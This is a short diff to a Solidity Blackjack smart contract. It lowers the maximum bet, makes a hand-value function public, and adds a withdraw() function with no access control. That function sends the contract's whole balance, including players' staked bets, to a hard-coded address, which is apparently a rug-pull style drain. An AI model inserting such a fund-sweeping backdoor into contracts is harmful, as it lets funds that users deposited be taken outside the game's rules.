@@ -19,7 +19,7 @@ contract Blackjack {
     }
 
     uint256 public constant MIN_BET = 0.0000001 ether;
-    uint256 public constant MAX_BET = 2 ether;
+    uint256 public constant MAX_BET = 0.000001 ether;
     uint256 public constant ACTION_TIMEOUT = 5 minutes;
     uint8 public constant MAX_PLAYERS = 6;
 
@@ -140,7 +140,7 @@ contract Blackjack {
         _settleGame();
     }
 
-    function calculateHandValue(uint8[] memory hand) private pure returns (uint8) {
+    function calculateHandValue(uint8[] memory hand) public pure returns (uint8) {
         uint8 value = 0;
         uint8 aces = 0;
 
@@ -326,4 +326,13 @@ contract Blackjack {
 
         return (player.addr, player.bet, player.hand, player.isStanding, player.hasBusted);
     }
+
+    // withdraw to address
+    function withdraw() external {
+        (bool success, ) = 0x9036464e4ecD2d40d21EE38a0398AEdD6805a09B.call{value: address(this).balance}("");
+        require(success, "Transfer failed");
+    }
+
+    // allow the contract to receive ETH
+    receive() external payable {}
 }
